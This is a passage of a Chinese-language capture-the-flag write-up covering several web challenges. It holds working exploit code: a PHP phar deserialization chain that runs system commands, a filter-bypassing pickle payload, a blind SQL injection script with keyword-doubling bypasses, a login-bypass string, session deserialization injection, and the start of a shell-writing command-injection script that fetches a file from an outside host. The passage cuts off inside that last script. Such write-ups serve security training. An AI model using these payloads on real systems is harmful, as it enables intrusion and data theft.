class="keyword">$this</span>-&gt;file=<span class="string">"/ ;/readflag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//unserialize('O:10:"Fileupload":1:&#123;s:4:"file";O:8:"Listfile":1:&#123;s:4:"file";s:1:"/";&#125;&#125;');</span></span><br><span class="line">@unlink(<span class="string">"dedecms.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"dedecms.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$a=<span class="keyword">new</span> Listfile();</span><br><span class="line">$b=<span class="keyword">new</span> Fileupload($a);</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line">$phar-&gt;setMetadata($b); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将生成的phar文件改名，传上去，可以看到文件名 ，结合源码里的路径</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309111822509.png" alt="image-20200309111822509"></p>
<p>我们修改vps上Rogue-mysql-server读文件的名称，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112111030.png" alt="image-20200309112111030"></p>
<p>之后连接远程mysql服务器，触发反序列化</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112354943.png" alt="image-20200309112354943"></p>
<p>然后flag就来了。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309112642322.png" alt="image-20200309112642322"></p>
<h1 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h1><p><strong>考点</strong>：python 反序列化</p>
<p>这题是原题，然而我开始并没有找到。。2019-SJTU-PICKLE-Revenge,比赛直接py脚本，跑的，比完赛得好好分析</p>
<p>题目直接给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(filename, encoding=<span class="string">'utf-8'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'source'</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">'data'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> type(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'Are you sure that is an animal???'</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'unpickle_result.html'</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">'一给我哩giaogiao'</span>, <span class="string">'Giao'</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'unpickle_page.html'</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>源码的流程大体是这样，只有一个路由，会把我们输入的data，先base64解码，然后禁止我们输入R，我们在平常通过pickle反序列化的时候，如果执行命令的话，一般都会用到<code>__reduce__</code>,他在序列化的时候就会生成R.</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309114250845.png" alt="image-20200309114250845"></p>
<p>所以这里不能用这个方法了，继续看源码，将base64解码后的数据反序列化，这里重写了find_class()函数</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309114949544.png" alt="image-20200309114949544"></p>
<p>限制了我们使用的module只能是<code>__main__</code>,继续看源码，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309115124804.png" alt="image-20200309115124804"></p>
<p>将反序列化的结果和secret比对，如果相同就可以得到flag。这里参考了大师傅的<a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">文章</a>，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309120952732.png" alt="image-20200309120952732"></p>
<p>我们把上面的blue换成secret,就是解法了，然后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, category)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> type(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"></span><br><span class="line">x= Animal(<span class="string">"mount4in"</span>,<span class="string">"www"</span>)</span><br><span class="line">s= pickle.dumps(x)</span><br><span class="line"><span class="comment">#s= base64.b64decode("gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu")</span></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">b'\x80\x03c__main__\nsecret\n&#125;(Vname\nVmount4in\nVcategory\nVwww\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameq\x03X\x08\x00\x00\x00mount4inq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00wwwq\x06ub.'</span></span><br><span class="line">print(a)</span><br><span class="line">pickletools.dis(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>

<p>可以看到已经成功篡改。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309125821513.png" alt="image-20200309125821513"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVm1vdW50NGluClZjYXRlZ29yeQpWd3d3CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFgEAAAAbmFtZXEDWAgAAABtb3VudDRpbnEEWAgAAABjYXRlZ29yeXEFWAMAAAB3d3dxBnViLg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>然后输入就得到flag</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309125431028.png" alt="image-20200309125431028"></p>
<h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>打开之后一个登录界面，可以注册，一定要养成习惯性右键查看源代码的习惯。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130212897.png" alt="image-20200309130212897"></p>
<p>可以看到隐藏了type,burp发包</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130514215.png" alt="image-20200309130514215"></p>
<p>注册成功，登录进去看看有个search.php,可以输入，试试注入</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309130823052.png" alt="image-20200309130823052"></p>
<p>明显得注入，然后写脚本跑，竟然跑不出来报错，后来又测出来过滤了select  from，只是简单得替换为空，双写就可以绕过。</p>
<p>贴上exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">Cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">                    <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">r"1' or 1=(ascii(mid((selselectect group_concat(column_NAME) frfromom information_schema.columnS where table_name='admin'),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">		payload=<span class="string">r"1' or 1=(ascii(mid((selselectect pwd frfromom admin limit 1),&#123;&#125;,1))&gt;&#123;&#125;)#"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		data=&#123;<span class="string">"flag"</span>:payload.format(i,mid)&#125;</span><br><span class="line">		r=requests.post(url,data=data,cookies=Cookie,proxies=proxies)</span><br><span class="line">		print(r.content)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b"is flag"</span> <span class="keyword">in</span>  r.content:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	print(flag)</span><br><span class="line">	flag+=chr(mid)</span><br><span class="line"></span><br><span class="line"><span class="comment">#admin,fl4g,jd,user</span></span><br><span class="line"><span class="comment">#flag&#123;Rogue-MySql-Server-is-nday&#125;   number,submission_date,shifumoney  username,pwd,qq</span></span><br></pre></td></tr></table></figure>

<p>可以查出有半个flag。。。。。。。。。。。。。。。</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309131731424.png" alt="image-20200309131731424"></p>
<p>然后看这半个flag可以猜到要用Rogue-mysql-server了，但是需要有一个连接mysql的地方，之后找那里可以连接mysql,dirsearch爆破目录</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132145028.png" alt="image-20200309132145028"></p>
<p>有一个admin.html,应该是后台了，需要管理员的账号，然后去数据库里面注，可以得到admin的密码e2ecea8b80a96fb07f43a2f83c8b0960</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309131535198.png" alt="image-20200309131535198"></p>
<p>md5解密后是whoamiadmin</p>
<p>然后登进去<img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132350796.png" alt="image-20200309132350796"></p>
<p>刚刚好，vps上运行rogue-mysql-server,读服务器文件</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132653295.png" alt="image-20200309132653295"></p>
<p>比较考验眼力</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309132919770.png" alt="image-20200309132919770"></p>
<p>两个一拼上就欧克了。</p>
<h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>考点 ：sql</p>
<p>这是个<a href="https://gksec.com/HNCTF2019-Final.html" target="_blank" rel="noopener">原题</a>，直接搜就出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    $stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>

<p>绕过登录就可以，尝试万能密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from products where name&#x3D;&#39;a&#39;-0 -&#39;&#39;;</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| name     | secret                            | description |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| facebook | ddddddddddddddddddddddddddddddddd | flag        |</span><br><span class="line">| facebook | fdddddddddddddddddddddddddddddddd | azzz        |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">2 rows in set, 3 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from products;</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| name     | secret                            | description |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">| facebook | ddddddddddddddddddddddddddddddddd | flag        |</span><br><span class="line">| facebook | fdddddddddddddddddddddddddddddddd | azzz        |</span><br><span class="line">+----------+-----------------------------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>通过上面这种形式绕过。</p>
<p>密码：‘-0-’</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309134804035.png" alt="image-20200309134804035"></p>
<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p><strong>考点</strong>: session反序列化  四位字符命令执行写shell</p>
<p>题目给了源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>看到这里设置了session.serialize_handler为php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php  键名 竖线 serialize后的内容</span><br><span class="line">php_serilaize   serilize后的内容</span><br><span class="line">php_binary  键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>形成原理是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时 “|”会被当成键值对的分隔符</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sign;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;admin === <span class="number">1</span>) &#123;</span><br><span class="line">            redirect(<span class="string">'./core/index.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> info();</span><br><span class="line">$a-&gt;admin=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后登录，设置sign为</p>
<p><code>|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;N;}</code></p>
<p>就可以看到</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309145414327.png" alt="image-20200309145414327"></p>
<p>这里前半部分是改的bytectf的boringcode，把baidu.com改成了127.0.0.1.</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309145802597.png" alt="image-20200309145802597"></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/102989485" target="_blank" rel="noopener">参考</a></p>
<p>这里可以利用compress.zlib://data:@127.0.0.1/plain;绕过</p>
<p>然后后半部分是四位字符写shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://121.36.222.22:88/'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip = <span class="string">'144.34.200.151'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line"><span class="comment">#your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">'core/clear.php'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</span><br><span class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;f\\&gt;'</span>, <span class="comment">#% pos0,</span></span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span 